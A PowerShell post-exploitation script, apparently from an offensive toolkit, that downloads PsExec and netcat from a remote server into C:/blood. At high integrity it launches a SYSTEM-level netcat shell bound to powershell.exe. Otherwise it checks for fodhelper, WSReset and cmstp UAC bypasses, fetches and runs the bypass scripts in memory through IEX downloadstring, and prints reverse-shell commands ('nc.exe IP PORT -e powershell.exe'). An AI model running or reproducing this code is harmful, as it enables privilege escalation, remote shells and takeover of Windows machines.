mkdir C:/blood
if([Environment]::Is64BitProcess -eq $True) {
    iwr $url_1029384756/tools/PsExec64.exe -OutFile C:/blood/psexec.exe
}else{
    iwr $url_1029384756/tools/PsExec.exe -OutFile C:/blood/psexec.exe
}
iwr $url_1029384756/tools/nc.exe -OutFile C:/blood/nc.exe
cp C:/blood/nc.exe C:/blood/nc_sys.exe

if($(whoami /groups | Select-String "High Mandatory") -ne $null) {
    Start-Job -ScriptBlock { C:\blood\psexec.exe -accepteula -s ''C:\blood\nc_sys.exe -l 1235 -e powershell.exe'' }
    Start-Sleep -Seconds 2
    C:\blood\nc_sys.exe 127.0.0.1 1235
} else {
    Write-Host "You are not in High Integrity Shell (High Mandatory Level), try to bypass UAC."
    Write-Host "ENUMERATING POSSIBLE VULNERABILITIES:"
    if(Test-Path C:\Windows\System32\fodhelper.exe) {
        Write-Host "`t [*] fodhelper.exe available, use > fodhelper -command 'C:\blood\nc.exe IP PORT -e powershell.exe' to exploit:"
        IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/UAC/fodhelper.txt")
    }
    if(Test-Path C:\Windows\System32\WSReset.exe) {
        Write-Host "`t [*] WSReset.exe available, use > WSResetBypass -Command 'C:\blood\nc.exe IP PORT -e powershell.exe' to exploit:"
        IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/UAC/WSResetBypass.txt")
    }
    if(Test-Path C:\windows\system32\cmstp.exe) {
        Write-Host "`t [*] cmstp.exe available, use > cmstpBypass -Command 'C:\blood\nc.exe IP PORT -e powershell.exe' to exploit:"
        IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/UAC/cmstpBypass.txt")
    }
    Write-Host "`n`n CHECK https://github.com/hfiref0x/UACME - expand Keys to get the unpatched exploit.`n" 
}